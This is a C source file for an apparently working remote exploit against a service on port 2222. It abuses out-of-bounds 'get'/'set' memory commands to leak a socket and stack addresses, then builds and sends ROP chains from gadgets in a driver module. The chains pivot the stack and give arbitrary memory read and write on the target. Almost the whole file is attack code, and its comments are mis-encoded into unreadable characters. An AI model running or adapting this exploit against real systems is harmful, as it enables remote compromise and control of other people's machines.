#include <MemWorker.h>

//ULONG glDriverBase;
//BOOL glIsStart;

BOOL WriteMem(IN SOCKET sock, IN int index, IN LPVOID lpData) {
    PCHAR buf;
    buf = (PCHAR)malloc(128);
    if (!buf) {
        printf("Error alloc mem\n");
        return FALSE;
    }
    RtlSecureZeroMemory(buf, 128);
    memcpy(buf, "set ", 4);
    _itoa_s((int)index, buf + 4, 15, 10);
    strcat(buf, "\n");
    if (!SendToTarget(sock, buf, strlen(buf))) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }
    if (!SendToTarget(sock, lpData, 4)) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }

    free(buf);
    return TRUE;
}

BOOL ReadMem(IN SOCKET sock, IN int index, OUT LPVOID lpData) {
    PCHAR buf;
    buf = (PCHAR)malloc(128);
    if (!buf) {
        printf("Error alloc mem\n");
        return FALSE;
    }
    RtlSecureZeroMemory(buf, 128);
    memcpy(buf, "get ", 4);
    _itoa_s((int)index, buf + 4, 15, 10);
    strcat(buf, "\n");
    if (!SendToTarget(sock, buf, strlen(buf))) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }
    if (RecvFromTarget(sock, lpData, 4) != 4) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }

    free(buf);
    return TRUE;
}

#define SIZE_IO_ROP_CHAIN  ((13) * 4)
#define SIZE_MAIN_ROP_CHAIN ((8) * 4)

BOOL StartMemWork(IN OUT PMEM_WORK worker) {

    BOOL retValue = TRUE;
    int iToLeakSock = 0, index = 0;
    //ULONG tmpRopChain[32];
    PULONG ropChain = (PULONG)malloc(0x1000);
    ULONG pRecvAddr = glDriverBase + rva_Recv;
    ULONG ropStub = 0x01010101;

    ULONG addrStartRop = (worker->stacks.targetStack - 0x40) + 0x500;
    ULONG addrIOrop = addrStartRop - 0x1000;
    
    ULONG gadRetn = glDriverBase + gad_ret;
    ULONG gadPopEbp = glDriverBase + gad_PopEbp;
    ULONG gadMovEspEbp = glDriverBase + gad_MovEspEbp;
    
    int ropIndex, stubEndIndex;

    if (worker->stacks.isUp) {
        iToLeakSock = GET_INDEX_UP(worker->stacks.mainStack, worker->stacks.diffStacks + (0x490 + 8));
        index = GET_INDEX_UP(worker->stacks.mainStack, worker->stacks.diffStacks - 0x4c);
    }
    else {
        iToLeakSock = GET_INDEX_DOWN(worker->stacks.mainStack, worker->stacks.diffStacks - 0x490 - 8);
        index = GET_INDEX_DOWN(worker->stacks.mainStack, (worker->stacks.diffStacks + 0x4c));
    }

    if (!ReadMem(worker->socks.mainSock, iToLeakSock, &worker->leakSock) || !worker->leakSock) { return FALSE; }
    printf("Leak sock: \t%08X\n", worker->leakSock);

    if (!ropChain) {
        printf("[Srart mem] Error alloc mem\n");
        retValue = FALSE;
    }

    if (!retValue) {
        free(ropChain);
        return retValue;
    }

    ropIndex = 0;
    ropChain[ropIndex] = gadPopEbp;                    // retn 8
   
    ropIndex = 3;
    ropChain[ropIndex++] = addrStartRop - 4;
    
    ropChain[ropIndex++] = gadMovEspEbp;
    
    stubEndIndex = ropIndex = (0x500 / 4);
    // debug
    ropChain[ropIndex++] = gadRetn;
    ropChain[ropIndex++] = gadRetn;
    ropChain[ropIndex++] = gadRetn;
    ropChain[ropIndex++] = gadRetn;

    ropChain[ropIndex++] = pRecvAddr;
    ropChain[ropIndex++] = glDriverBase + gad_PopEbp;       // retAddr 
    ropChain[ropIndex++] = worker->leakSock;             // socket
    ropChain[ropIndex++] = addrIOrop;                   // buf
    ropChain[ropIndex++] = SIZE_IO_ROP_CHAIN;              // bufSize !!!
    ropChain[ropIndex++] = 0;                            // flag
    ropChain[ropIndex++] = addrIOrop - 4;               // ebpValue = IO rop addr - 4
    ropChain[ropIndex++] = gadMovEspEbp;                // mov esp, ebp; ret

    printf("Addr recv rop: \t%08X\n", addrStartRop);
    printf("Addr IO rop: \t%08X\n", addrIOrop);

    //memcpy(ropChain, tmpRopChain, 6 * 4);
    //for (int i = 8; i < (2048+8); ++i) {              // ret chain
    //    ropChain[i] = glDriverBase + gad_ret;
    //}
    //ropChain[2056] = ropStub;                     // functionAddr
    //ropChain[2057] = glDriverBase + gad_PopEbp;   // retaddr = pop ebp; retn
    //for (int i = 2058; i < (2058+4); ++i) {             // frame send \ recv
    //    ropChain[i] = ropStub;
    //}
    //ropChain[2064] = addrStartRop;                 // ebp value
    //ropChain[2065] = glDriverBase + gad_MovEspEbp; // mov esp, ebp; pop ebp; retn

    for (int i = 0; i < ropIndex; ++i) {
        if (i == 1 || i == 2 || 
            (i >= 5 && i < stubEndIndex)) {
            continue;
        }
        if (!WriteMem(worker->socks.mainSock, index + i, &ropChain[i])) { return FALSE; }
    }
    
    Sleep(1000);
    // ���������� ������� ��� ������ ���������� ���-�������
    if (!SendToTarget(worker->socks.targetSock, (LPVOID)"\n", 1)) { 
        retValue = FALSE; 
    }

    free(ropChain);
    return retValue;
}

BOOL CloseMemWork(IN OUT PMEM_WORK worker) {
   
    BOOL retValue = TRUE;
    PULONG ropChain = (PULONG)malloc(SIZE_IO_ROP_CHAIN + 16);
    //ULONG addrStartRop = worker->stacks.targetStack - 0x48;
    ULONG ropStub = 0x01010101;
    ULONG countStubs = (SIZE_IO_ROP_CHAIN / 4) - 2;
    int ropIndex = 0;

    if (!ropChain) {
        printf("[Srart mem] Error alloc mem\n");
        return FALSE;
    }

    ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;
    ropChain[ropIndex++] = worker->leakSock;
    for (; ropIndex < countStubs; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }

    if (!SendToTarget(worker->socks.targetSock, (LPVOID)&ropChain[0], SIZE_IO_ROP_CHAIN)) {
        printf("[Close mem] Error send rop\n");
        retValue = FALSE;
    }

    free(ropChain);
    return retValue;
}

static BOOL MemWorkRopStage(IN ULONG IOfuncAddr, IN OUT PSOCKETS socks, IN ULONG workerStack, IN ULONG addr, IN ULONG len) {
    
    ULONG leakSock = 0;
    int iToLeakSock = 0;
    ULONG stackTarget = 0, diffStacks;
    BOOL isUp = TRUE;
   
    //PCHAR tmp = malloc(4);
    ULONG ropChain[8];
    int index = 0;

    if (!SelectConnection(socks, workerStack, &stackTarget, &diffStacks, &isUp)) {
        return FALSE;
    }

    if (isUp) {
        iToLeakSock = GET_INDEX_UP(workerStack, diffStacks + (0x490 + 8));
        index = GET_INDEX_UP(workerStack, (diffStacks - 0x4c)); // index to retAddr from GetRequest
    }
    else {
        iToLeakSock = GET_INDEX_DOWN(workerStack, diffStacks - 0x490 - 8);
        index = GET_INDEX_DOWN(workerStack, (diffStacks + 0x4c));
    }
    if (!ReadMem(socks->mainSock, iToLeakSock, &leakSock) || !leakSock) { return FALSE; }
    //printf("[mem rop] target stack: \t%08X -> %08X\n", index, stackTarget);
    ropChain[0] = IOfuncAddr;
    //ropChain[1] = leakSock;
    //ropChain[2] = (ULONG)(&tmp[0]);
    ropChain[3] = glDriverBase + rva_PR_CloseSocket; // addr call CloseSocket mb
    ropChain[4] = leakSock;
    ropChain[5] = addr;
    ropChain[6] = len;
    ropChain[7] = 0;
    for (int i = 0; i < sizeof(ropChain) / sizeof(ULONG); ++i) {
        if (i == 1 || i == 2) {
            continue;
        }
        if (!WriteMem(socks->mainSock, index + i, &ropChain[i])) { return FALSE; }
    }

    return TRUE;
}

// ���������� ���� � ��������� ����� � ������-������, ��� ��������� ������� (Send \ recv) -> recv -> (send \ recv) -> recv -> ...
// ���� ������� ������ �����, ������� ����� ���������, ���������� �� ��� �������
BOOL ReadMemByAddr(IN SOCKET sock, IN ULONG workerStack, IN ULONG addr, OUT LPVOID buf, IN ULONG len) {
    ULONG pSendFunc = glDriverBase + rva_Send;
    SOCKETS socks;// = { INVALID_SOCKET, INVALID_SOCKET, };
    CHAR trigMsg[] = { "\n" };
    socks.mainSock = sock;
    BOOL retValue = TRUE;

    if (MemWorkRopStage(pSendFunc, &socks, workerStack, addr, len)) {
        //;
        Sleep(500);
        if (SendToTarget(socks.targetSock, trigMsg, 1)) {
            if (RecvFromTarget(socks.targetSock, buf, len) != len) {
                printf("Error read with rops\n");
                //CloseTmpConnections(&socks);
                retValue = FALSE;
            }
        }
        else {
            retValue = FALSE;
        }
        ////;
    }
    else {
        retValue = FALSE;
    }
    
    CloseTmpConnections(&socks);
    return retValue;
}

BOOL MemWork(IN PMEM_WORK worker, IN MEM_OP operation, IN ULONG addr, IN OUT LPVOID buf, IN ULONG len) {
    
    BOOL retValue = TRUE;
    ULONG pSendFunc = glDriverBase + rva_Send;
    ULONG pRecvAddr = glDriverBase + rva_Recv;
    //ULONG tmpRopChain[32];
    PULONG ropChain = (PULONG)malloc(SIZE_IO_ROP_CHAIN + 16);
    PULONG mainRopChain = (PULONG)malloc(SIZE_MAIN_ROP_CHAIN + 16);

    ULONG addrStartRop = (worker->stacks.targetStack - 0x40) + 0x500;
    ULONG addrIOrop = addrStartRop - 0x1000;
    
    ULONG gadPopEbp = glDriverBase + gad_PopEbp;
    ULONG gadMovEspEbp = glDriverBase + gad_MovEspEbp;

    int ropIndex, mainRopIndex, tmpIndex;

    if (!ropChain || !mainRopChain) {
        printf("[Srart mem] Error alloc mem\n");
        return FALSE;
    }

    
    ropIndex = 0;
    //ropChain[ropIndex++] = operation == mem_read ? pSendFunc : pRecvAddr ;
    //ropChain[ropIndex++] = pRecvAddr;
    //ropChain[ropIndex++] = worker->leakSock;
    //ropChain[ropIndex++] = addr;
    //ropChain[ropIndex++] = len;
    //ropChain[ropIndex++] = 0;

    //// ��� ��� �������������� �������������� �������
    //ropChain[ropIndex++] = gadPopEbp;
    //ropChain[ropIndex++] = worker->leakSock;
    //ropChain[ropIndex++] = addrStartRop;
    //ropChain[ropIndex++] = SIZE_MAIN_ROP_CHAIN;
    //ropChain[ropIndex++] = 0;
    //ropChain[ropIndex++] = addrStartRop - 4;
    //ropChain[ropIndex++] = gadMovEspEbp;
    
    // ��� ��� �������������� �������������� �������
    ropChain[ropIndex++] = pRecvAddr;
    ropChain[ropIndex++] = operation == mem_read ? pSendFunc : pRecvAddr;
    ropChain[ropIndex++] = worker->leakSock;
    ropChain[ropIndex++] = addrStartRop;
    ropChain[ropIndex++] = SIZE_MAIN_ROP_CHAIN;
    ropChain[ropIndex++] = 0;

    // ��� ��� ������ ������
    ropChain[ropIndex++] = gadPopEbp;
    ropChain[ropIndex++] = worker->leakSock;
    ropChain[ropIndex++] = addr;
    ropChain[ropIndex++] = len;
    ropChain[ropIndex++] = 0;
    ropChain[ropIndex++] = addrStartRop - 4;
    ropChain[ropIndex++] = gadMovEspEbp;

    mainRopIndex = 0;
    mainRopChain[mainRopIndex++] = pRecvAddr;
    mainRopChain[mainRopIndex++] = gadPopEbp;       // retAddr 
    mainRopChain[mainRopIndex++] = worker->leakSock;             // socket
    mainRopChain[mainRopIndex++] = addrIOrop;                   // buf
    mainRopChain[mainRopIndex++] = SIZE_IO_ROP_CHAIN;              // bufSize !!!
    mainRopChain[mainRopIndex++] = 0;                            // flag
    mainRopChain[mainRopIndex++] = addrIOrop - 4;               // ebpValue 
    mainRopChain[mainRopIndex++] = gadMovEspEbp;                // mov esp, ebp; ret

    //ropChain[0] = pRecvAddr;                    // retn 8
    //ropChain[1] = glDriverBase + gad_ret;       // retAddr 
    //ropChain[2] = worker->leakSock;             // socket
    //ropChain[3] = addrStartRop + 4;             // buf
    //ropChain[4] = SIZE_IO_ROP_CHAIN;                     // bufSize !!!
    //ropChain[5] = 0;                            // flag
    ////memcpy(ropChain, tmpRopChain, 6 * 4);
    //for (int i = 6; i < (2048+6); ++i) {              // ret chain
    //    ropChain[i] = glDriverBase + gad_ret;
    //}
    //// send frame
    //ropChain[2056] = pSendFunc;
    //ropChain[2057] = glDriverBase + gad_PopEbp;
    //ropChain[2058] = worker->leakSock;
    //ropChain[2059] = addr;
    //ropChain[2060] = len;
    //ropChain[2061] = 0;
    //// end cycle
    //ropChain[2062] = addrStartRop;                // ebp value
    //ropChain[2063] = glDriverBase + gad_MovEspEbp; // mov esp, ebp; pop ebp; retn
    //;

    // ���������� ���-������� 
    if (!SendToTarget(worker->socks.targetSock, (LPVOID)&ropChain[0], SIZE_IO_ROP_CHAIN)) {
        printf("[Read mem] Error send rop\n");
        free(ropChain);
        free(mainRopChain);
        return FALSE;
    }

    
    // ��������������� �������������� ���-�������
    //printf("[Mem] reconstuct main rop\n");
    if (!SendToTarget(worker->socks.targetSock, (LPVOID)&mainRopChain[0], SIZE_MAIN_ROP_CHAIN)) {
        printf("[Read mem] Error send rop\n");
        free(ropChain);
        free(mainRopChain);
        return FALSE;
    }

    ;
    if (operation == mem_read) {
        //printf("[Read mem] read operations\n");
        if (RecvFromTarget(worker->socks.targetSock, buf, len) != len) {
            printf("[Read mem] Error read with rops\n");
            //CloseTmpConnections(&socks);
            retValue = FALSE;
        }
    }
    else {
        //printf("[Write mem] write operations\n");
        if (!SendToTarget(worker->socks.targetSock, buf, len)) {
            printf("[Write mem] Error write with rops\n");
            retValue = FALSE;
        }
    }

    //Sleep(500);
    free(ropChain);
    free(mainRopChain);
    return retValue;
}

BOOL WriteMemByAddr(IN SOCKET sock, IN ULONG workerStack, IN ULONG addr, IN LPVOID buf, IN ULONG len) {
    
    ULONG pRecvFunc = glDriverBase + rva_Recv;
    SOCKETS socks;// = { INVALID_SOCKET, INVALID_SOCKET, };
    CHAR trigMsg[] = { "\n" };
    socks.mainSock = sock;
    BOOL retValue = TRUE;

    if (MemWorkRopStage(pRecvFunc, &socks, workerStack, addr, len)) {
        //;
        Sleep(500);
        if (SendToTarget(socks.targetSock, trigMsg, 1)) {
            //;
            if (!SendToTarget(socks.targetSock, buf, len)) {
                printf("Error write with rops\n");
                retValue = FALSE;
            }
        }
        else {
            retValue = FALSE;
        }
    }
    else {
        retValue = FALSE;
    }

    CloseTmpConnections(&socks);
    return retValue;
}

BOOL WriteMemByAddr2(IN PMEM_WORK worker, IN ULONG addr, IN LPVOID buf, IN ULONG len) {
    return 0;
}


BOOL SelectConnection(IN OUT PSOCKETS socks, IN ULONG workerStack, OUT PULONG targetStack, IN OUT PULONG diffStacks, OUT PBOOL isUp) {
    
    DWORD counterTmpSocks = 0;
    SOCKET tmpSock = INVALID_SOCKET;
    ULONG stackTarget = 0;
    int pr = 0;
    
    for (int i = 0; i < COUNT_SOCKS; ++i) {
        socks->tmpSocks[i] = INVALID_SOCKET;
    }

    //if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
    //if(!ReadMem(tmpSock, -1, &stackTarget)){ return FALSE; }
    //stackTarget = stackTarget - 0x408 - 4; // ads struct
    //index = GET_INDEX_DOWN(stackTarget, 0x4c);

    while (TRUE) {
        //printf("Select connection->");
        /*++pr;
        if (pr % 10 == 0) {
            printf("#");            
        }
        if (pr == 100) {
            pr = 0;
            printf("\r           ");
        }*/
        if (counterTmpSocks >= COUNT_SOCKS) {
            for (int i = 0; i < COUNT_SOCKS; ++i) {
                CloseSock(&socks->tmpSocks[i]);
            }
            counterTmpSocks = 0;
        }
        if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
        socks->tmpSocks[counterTmpSocks] = tmpSock;
        counterTmpSocks++;
        if (!ReadMem(tmpSock, -1, &stackTarget)) {
            //CloseTmpConnections(socks);
            return FALSE;
        }
        stackTarget = stackTarget - 0x408 - 4;
        if (stackTarget > workerStack) {
            *diffStacks = stackTarget - workerStack;
            *isUp = TRUE;
        }
        else {
            *diffStacks = workerStack - stackTarget;
            *isUp = FALSE;
        }

        if (((*diffStacks + 0x4c) / 4) > MAXSHORT) {
            //CloseSock(tmpSock);
            continue;
        }

        socks->targetSock = tmpSock;
        socks->tmpSocks[counterTmpSocks] = INVALID_SOCKET;
        break;
    }
    //printf("\n");
    *targetStack = stackTarget;

    return TRUE;
}
